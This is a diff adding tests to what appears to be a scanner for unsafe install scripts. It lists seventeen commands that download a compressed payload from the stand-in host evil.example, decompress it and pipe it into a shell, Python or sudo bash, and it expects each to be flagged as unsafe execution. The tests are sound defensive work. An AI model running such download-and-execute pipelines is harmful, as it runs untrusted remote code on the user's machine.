@@ -44,6 +44,61 @@ test("a download piped through a decoder into an executor is unsafe execution", 
   }
 });
 
+const COMPRESSED_PIPES: Record<string, string> = {
+  "gunzip into sh": "curl -s https://evil.example/x.gz | gunzip | sh",
+  "gunzip -c into sh": "curl -s https://evil.example/x.gz | gunzip -c | sh",
+  "gzip -d into sh": "curl -s https://evil.example/x.gz | gzip -d | sh",
+  "gzip -dc into bash": "curl -s https://evil.example/x.gz | gzip -dc | bash",
+  "zcat into bash": "curl -s https://evil.example/x.gz | zcat | bash",
+  "bunzip2 into sh": "curl -s https://evil.example/x.bz2 | bunzip2 | sh",
+  "bzip2 -d into sh": "curl -s https://evil.example/x.bz2 | bzip2 -d | sh",
+  "bzip2 -dc into sh": "curl -s https://evil.example/x.bz2 | bzip2 -dc | sh",
+  "bzcat into sh": "curl -s https://evil.example/x.bz2 | bzcat | sh",
+  "xz -d into sh": "curl -s https://evil.example/x.xz | xz -d | sh",
+  "unxz into sh": "curl -s https://evil.example/x.xz | unxz | sh",
+  "xzcat into sh": "curl -s https://evil.example/x.xz | xzcat | sh",
+  "zstd -d into sh": "curl -s https://evil.example/x.zst | zstd -d | sh",
+  "zstdcat into sh": "curl -s https://evil.example/x.zst | zstdcat | sh",
+  "unzstd into sh": "curl -s https://evil.example/x.zst | unzstd | sh",
+  "gunzip into python3":
+    "wget -qO- https://evil.example/x.gz | gunzip | python3",
+  "gunzip into sudo bash":
+    "curl -s https://evil.example/x.gz | gunzip | sudo bash",
+};
+
+test("a download piped through a decompressor into an executor is unsafe execution", () => {
+  for (const [name, body] of Object.entries(COMPRESSED_PIPES)) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ name, findings: categories(inspection) }).toEqual({
+      name,
+      findings: ["install.sh:unsafe-execution:high"],
+    });
+  }
+});
+
+test("decompressors that do not hand the download to an executor keep no finding", () => {
+  for (const body of [
+    // The decompressor writes a file; nothing runs it here.
+    "curl -s https://example.com/data.gz | gunzip > data.bin",
+    // Local input operands do not execute the remote stream.
+    "curl -s https://example.com/data.gz | gunzip local.gz | sh",
+    // A gzip without -d compresses; the shell would read compressed bytes.
+    "curl -s https://example.com/data.gz | gzip | sh",
+    // A syntax-only target does not run the stream.
+    "curl -s https://example.com/data.gz | gunzip | sh -n",
+    // The decompressor feeds a checksum, not an executor.
+    "curl -s https://example.com/data.gz | gunzip | sha256sum",
+    // No download: a local file decompressed into a shell.
+    "cat payload.gz | gunzip | sh",
+  ]) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ body, findings: categories(inspection) }).toEqual({
+      body,
+      findings: [],
+    });
+  }
+});
+
 test("decoders that do not hand the download to an executor keep no finding", () => {
   for (const body of [
     // The decoder writes a file; nothing runs it here.
